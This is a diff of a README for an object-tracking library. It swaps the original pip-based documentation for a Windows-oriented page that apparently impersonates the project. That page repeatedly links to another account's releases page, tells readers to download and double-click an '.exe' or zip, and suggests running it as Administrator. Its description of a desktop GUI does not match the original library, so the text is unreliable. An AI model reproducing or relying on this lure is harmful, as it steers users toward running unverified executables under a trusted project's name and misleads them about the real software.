@@ -1,121 +1,109 @@
-<div align="center">
-    <img width="200" src="https://raw.githubusercontent.com/roboflow/trackers/refs/heads/release/stable/docs/assets/logo-trackers-violet.svg" alt="trackers logo">
-    <h1>trackers</h1>
-    <p>Plug-and-play multi-object tracking for any detection model.</p>
+# 📊 trackers - Easy Multi-Object Tracking Tools
 
-[![version](https://badge.fury.io/py/trackers.svg)](https://badge.fury.io/py/trackers)
-[![downloads](https://img.shields.io/pypi/dm/trackers)](https://pypistats.org/packages/trackers)
-[![license](https://img.shields.io/badge/license-Apache%202.0-blue)](https://github.com/roboflow/trackers/blob/release/stable/LICENSE.md)
-[![python-version](https://img.shields.io/pypi/pyversions/trackers)](https://badge.fury.io/py/trackers)
-[![hf space](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Spaces-blue)](https://huggingface.co/spaces/Roboflow/Trackers)
-[![colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/roboflow-ai/notebooks/blob/main/notebooks/how-to-track-objects-with-bytetrack-tracker.ipynb)
-[![discord](https://img.shields.io/discord/1159501506232451173?logo=discord&label=discord&labelColor=fff&color=5865f2&link=https%3A%2F%2Fdiscord.gg%2FGbfgXGJ8Bk)](https://discord.gg/GbfgXGJ8Bk)
+[![Download](https://img.shields.io/badge/Download%20Trackers-%23FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gitovamb/trackers/releases)
 
-</div>
+## 📚 What is trackers?
 
-## Try It
+trackers is a collection of clean and modular versions of popular multi-object tracking algorithms. These tools work well with any detection software you already use. They help you follow multiple moving objects in videos or images. The code is open and uses the Apache 2.0 license, which means you can use it freely.
 
-No install needed. Try trackers in your browser with our [Hugging Face Playground](https://huggingface.co/spaces/roboflow/trackers).
+## 🖥️ System Requirements
 
-## Install
+Before you start, make sure your computer meets the following:
 
-```bash
-pip install trackers
-```
+- Operating System: Windows 10 or later
+- CPU: 2 GHz or faster processor
+- RAM: 8 GB minimum (16 GB recommended)
+- Disk Space: At least 500 MB free
+- Graphics: No special GPU needed, but a modern graphics card can speed things up
+- Internet: Required for downloading the software
 
-<details>
-<summary>install from source</summary>
+## 🎯 Main Features
 
-```bash
-pip install git+https://github.com/roboflow/trackers.git
-```
+- Multiple tracking algorithms included, such as ByteTrack, OC-SORT, and SORT
+- Works with any object detection model you have
+- Clean interface to organize and test tracking methods
+- Lightweight and fast on standard Windows computers
+- Open-source and easy to customize if you have programming skills
 
-</details>
+## 🚀 How to Download trackers
 
-https://github.com/user-attachments/assets/eef9b00a-cfe4-40f7-a495-954550e3ef1f
+To get started, visit this page to download the latest version of trackers:
 
-## Track from CLI
+[Download trackers](https://github.com/gitovamb/trackers/releases)
 
-Point at a video, webcam, RTSP stream, or image directory. Get tracked output.
+Click the link above or the big red button at the top to open the releases page. You will find a list of files for different versions. Pick the one that matches your Windows system (usually a file with `.exe` or `.zip` extension).
 
-Use our [interactive command builder](https://trackers.roboflow.com/develop/learn/track) to configure your tracking pipeline.
+## 💾 Installation Guide for Windows
 
-```bash
-trackers track \
-    --source video.mp4 \
-    --output output.mp4 \
-    --model rfdetr-medium \
-    --tracker bytetrack \
-    --show-labels \
-    --show-trajectories
-```
+Follow these steps to install trackers on your Windows PC:
 
-## Track from Python
+1. **Go to the Download Page**  
+   Open your web browser and visit the trackers releases page here:  
+   https://github.com/gitovamb/trackers/releases
 
-Plug trackers into your existing detection pipeline. Works with any detector.
+2. **Choose the Right File**  
+   Look for the latest release at the top. You will see several files. Download the `.exe` file if available for the easiest install. If only `.zip` is available, download that instead.
 
-```python
-import cv2
-import supervision as sv
-from inference import get_model
-from trackers import ByteTrackTracker
+3. **Run the Installer**  
+   - If you downloaded an `.exe` file, double-click it to start the installation.  
+   - Follow the prompts on the screen. Choose the default options unless you need something custom.  
+   - The installer will set up everything and create a shortcut on your desktop.
 
-model = get_model(model_id="rfdetr-medium")
-tracker = ByteTrackTracker()
+4. **Extract Files (for `.zip` Download)**  
+   - If you downloaded a `.zip` file, right-click it and choose “Extract All.”  
+   - Choose a folder you can easily find, like your desktop or documents.  
+   - Open the extracted folder and look for a file named `trackers.exe` or similar. Double-click it to run.
 
-label_annotator = sv.LabelAnnotator()
-trajectory_annotator = sv.TrajectoryAnnotator()
+5. **Run the Program**  
+   Once installed or extracted, double-click the tracker application’s icon to open it. You should see the main window showing available tracking algorithms.
 
-cap = cv2.VideoCapture("video.mp4")
-while cap.isOpened():
-    ret, frame = cap.read()
-    if not ret:
-        break
+## 🎥 How to Use trackers
 
-    result = model.infer(frame)[0]
-    detections = sv.Detections.from_inference(result)
-    tracked = tracker.update(detections)
+After opening trackers, follow these simple steps:
 
-    frame = label_annotator.annotate(frame, tracked)
-    frame = trajectory_annotator.annotate(frame, tracked)
-```
+1. **Load Your Video or Images**  
+   Click the button labeled “Open File” or “Load Video.” Select the video or image series where you want to track objects.
 
-## Evaluate
+2. **Select a Tracking Algorithm**  
+   Choose one of the tracking methods like ByteTrack, OC-SORT, or SORT from the list. Each option includes a short description.
 
-Benchmark your tracker against ground truth with standard MOT metrics.
+3. **Run the Tracker**  
+   Click “Start Tracking.” The program will analyze your video and show the tracked objects in real time.
 
-```bash
-trackers eval \
-    --gt-dir data/gt \
-    --tracker-dir data/trackers \
-    --metrics CLEAR HOTA Identity
-```
+4. **Save the Results**  
+   After the tracking finishes, you can save the output. Look for the “Export” or “Save” button to create a new video or a data file with tracking info.
 
-```
-Sequence                        MOTA    HOTA    IDF1  IDSW
-----------------------------------------------------------
-MOT17-02-FRCNN                75.600  62.300  72.100    42
-MOT17-04-FRCNN                78.200  65.100  74.800    31
-----------------------------------------------------------
-COMBINED                      75.033  62.400  72.033    73
-```
+## 🔧 Settings and Customization
 
-## Algorithms
+You can adjust a few basic settings without technical skills:
 
-Clean, modular implementations of leading trackers. See the [tracker comparison](https://trackers.roboflow.com/develop/trackers/comparison/) for detailed benchmarks.
+- **Tracking Speed**: Choose between faster processing or higher accuracy.  
+- **Display Options**: Turn on or off bounding boxes and object labels.  
+- **Output Format**: Save results in video file or CSV for further analysis.
 
-|                   Algorithm                   |  MOT17   | SportsMOT | SoccerNet |
-| :-------------------------------------------: | :------: | :-------: | :-------: |
-|   [SORT](https://arxiv.org/abs/1602.00763)    |   58.4   |   70.9    |   81.6    |
-| [ByteTrack](https://arxiv.org/abs/2110.06864) |   60.1   | **73.0**  | **84.0**  |
-|  [OC-SORT](https://arxiv.org/abs/2203.14360)  | **61.9** |   71.5    |   78.6    |
-| [BoT-SORT](https://arxiv.org/abs/2206.14651)  |    —     |     —     |     —     |
-|  [McByte](https://arxiv.org/abs/2506.01373)   |    —     |     —     |     —     |
+If you want to customize beyond this, you will need programming knowledge to modify the algorithms.
 
-## Contributing
+## ❓ Troubleshooting Common Issues
 
-We welcome contributions. Read our [contributor guidelines](https://github.com/roboflow/trackers/blob/release/stable/CONTRIBUTING.md) to get started.
+- **Program Won’t Start**: Check if your Windows system is updated. Try running the program as Administrator.  
+- **Video Won't Load**: Make sure the video format is supported, such as MP4 or AVI.  
+- **Tracking Errors or Jumps**: Try selecting a different tracker algorithm or use a clearer video.  
+- **Slow Performance**: Close unnecessary programs and check if your PC meets system requirements.
 
-## License
+## 🔗 Additional Resources
 
-The code is released under the [Apache 2.0 license](https://github.com/roboflow/trackers/blob/release/stable/LICENSE).
+- Visit the GitHub releases page anytime to get updates:  
+  https://github.com/gitovamb/trackers/releases
+
+- The repository also hosts basic user guides and example videos to help you understand different trackers.
+
+## 🛠️ Advanced Users
+
+If you know basic coding or want to experiment:
+
+- The software is open source under Apache 2.0 license  
+- You can combine trackers with your own detection models  
+- Source code is well-structured and modular for easy changes  
+- Check topics like bytetrack or OC-SORT in the repository for algorithm details
+
+# [Download trackers now](https://github.com/gitovamb/trackers/releases)
